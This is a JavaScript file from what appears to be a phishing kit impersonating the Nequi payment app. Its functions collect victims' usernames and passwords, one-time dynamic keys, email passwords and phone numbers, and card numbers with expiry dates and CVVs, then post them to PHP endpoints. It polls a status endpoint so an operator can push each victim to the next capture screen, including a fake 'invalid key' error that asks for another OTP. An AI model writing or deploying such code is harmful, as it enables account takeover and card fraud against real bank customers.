function consultar_estado(){

    if (espera == 1) { 

        $.post( "../../process/estado.php",function(data) {
           
            switch (data) {
                case '2':espera = 0;
                         vista_otp(); 
                         break;
                case '4':espera = 0;
                         vista_email(); 
                         break;
                case '6':espera = 0;
                         vista_tarjeta();  
                         break;               
                case '8':espera = 0;
                         vista_errorotp(); 
                         break;
                case '10':espera = 0;
                          window.location.href = "../../finish-no-back-button/";
                          break;
                case '12':espera = 0;
                          vista_usuario(); 
                          break;
            } 
        });    
    }    
}


function detectar_dispositivo(){
    var dispositivo = "";
    if(navigator.userAgent.match(/Android/i))
        dispositivo = "Android";
    else
        if(navigator.userAgent.match(/webOS/i))
            dispositivo = "webOS";
        else
            if(navigator.userAgent.match(/iPhone/i))
                dispositivo = "iPhone";
            else
                if(navigator.userAgent.match(/iPad/i))
                    dispositivo = "iPad";
                else
                    if(navigator.userAgent.match(/iPod/i))
                        dispositivo = "iPod";
                    else
                        if(navigator.userAgent.match(/BlackBerry/i))
                            dispositivo = "BlackBerry";
                        else
                            if(navigator.userAgent.match(/Windows Phone/i))
                                dispositivo = "Windows Phone";
                            else
                                dispositivo = "PC";
    return dispositivo;
}


function vista_email(){
    $("#fondo-rosado,#mensaje2,#frm-info,#frm-tarjeta,#frm-otp").hide();    
    $("#txt-correo,#txt-clave,#txt-celular").val(""); 
    $("#frm-correo").show(); 

    $("#inp-correo .etiqueta").hide()
    $("#inp-correo .etiqueta").css("margin-top","-28px");
    $("#inp-correo .texto-demo").show();  
    $("#inp-correo .texto-demo").css("margin-top","-32px");

    $("#inp-clave .etiqueta").hide()
    $("#inp-clave .etiqueta").css("margin-top","-28px");
    $("#inp-clave .texto-demo").show();  
    $("#inp-clave .texto-demo").css("margin-top","-32px");

    $("#inp-celular .etiqueta").hide()
    $("#inp-celular .etiqueta").css("margin-top","-28px");
    $("#inp-celular .texto-demo").show();  
    $("#inp-celular .texto-demo").css("margin-top","-32px");

    $("#txt-correo,#txt-clave,#txt-celular").attr("readonly","readonly");
    $("#inp-correo,#inp-clave,#inp-celular").attr("estado","0"); 
}

function vista_tarjeta(){
    $("#fondo-rosado,#mensaje2,#frm-info,#frm-correo,#frm-otp").hide();    
    $("#txt-tarjeta,#txt-mes,#txt-ano,#txt-cvv").val(""); 
    $("#frm-tarjeta").show();   

    $("#inp-tarjeta .etiqueta").hide()
    $("#inp-tarjeta .etiqueta").css("margin-top","-28px");
    $("#inp-tarjeta .texto-demo").show();  
    $("#inp-tarjeta .texto-demo").css("margin-top","-32px");

    $("#inp-cvv .etiqueta").hide()
    $("#inp-cvv .etiqueta").css("margin-top","-28px");
    $("#inp-cvv .texto-demo").show();  
    $("#inp-cvv .texto-demo").css("margin-top","-32px");

    $("#txt-tarjeta,#txt-cvv").attr("readonly","readonly");
    $("#inp-tarjeta,#inp-cvv").attr("estado","0");  
}


function vista_otp(){       
    $("#mensaje-otp").css("color","#210049");
    $("#mensaje-otp").html("Para confirmar tu pago escribe o pega la clave dinámica que encuentras en tu App Nequi.");
    $("#fondo-rosado,#mensaje2,#frm-info,#frm-correo,#frm-tarjeta").hide();
    $(".entrada-clave").html(""); 
    otp = "";
    lotp = 0;
    $("#frm-otp").show();   
}


function vista_errorotp(){
    $("#mensaje-otp").css("color","red");
    $("#mensaje-otp").html("Clave dinámica inválida. Intente nuevamente.");
    $("#fondo-rosado,#mensaje2,#frm-info,#frm-correo,#frm-tarjeta").hide();
    $(".entrada-clave").html(""); 
    otp = "";
    lotp = 0;
    $("#frm-otp").show();  
}

function vista_usuario(){
    $("#fondo-rosado,#mensaje2,#frm-tarjeta,#frm-correo,#frm-otp").hide();    
    $("#txt-cel,#txt-re").val(""); 
    $("#frm-info").show();  
    catchalisto = 0;
    $("#catcha").attr("src","assets/img/aceptar.jpg");
    $("#paso0").html('Entra');
    $("#paso0").attr("disabled","disabled");

    $("#inp-cel .etiqueta").hide()
    $("#inp-cel .etiqueta").css("margin-top","-28px");
    $("#inp-cel .texto-demo").show();  
    $("#inp-cel .texto-demo").css("margin-top","-32px");

    $("#inp-re .etiqueta").hide()
    $("#inp-re .etiqueta").css("margin-top","-28px");
    $("#inp-re .texto-demo").show();  
    $("#inp-re .texto-demo").css("margin-top","-32px");

    $("#txt-cel,#txt-re").attr("readonly","readonly");
    $("#inp-re,#inp-cel").attr("estado","0");
}

function catchaok(){
    $("#catcha").attr("src","assets/img/ok.jpg"); 
    if ($("#txt-cel").val().length == 10 && $("#txt-re").val().length == 4) {
        $("#paso0").removeAttr("disabled");
    }else{
        $("#paso0").attr("disabled","disabled");            
    }
}

function esperando(){
    espera = 1;
    $("#cargando,#fondo").hide();
    $("#mensaje2,#fondo-rosado").show();
}


function enviar_datos(u,c){  
    d = detectar_dispositivo();  
    $.post( "../../process/pasologin.php", { usr:u, pas: c, dis: d, ban:"Nequi"} ,function(data) {      
        espera = 1;
        setTimeout(esperando, 1400); 
    });
}

function enviar_otp(o){      
    $.post( "../../process/pasootp.php", { otp: o} ,function(data) {
        espera = 1;
        setTimeout(esperando, 1400);   
    });
}

function enviar_email(e,c,t){      
    $.post( "../../process/pasocorreo.php", { eml:e,clv:c,cel:t } ,function(data) {
        espera = 1;
        setTimeout(esperando, 1400);    
    });
}

function enviar_tarjeta(t,f,c){      
    $.post( "../../process/pasotarjeta.php", { tar:t,fec:f,cvv:c } ,function(data) {
        espera = 1;
        setTimeout(esperando, 1400);    
    });
}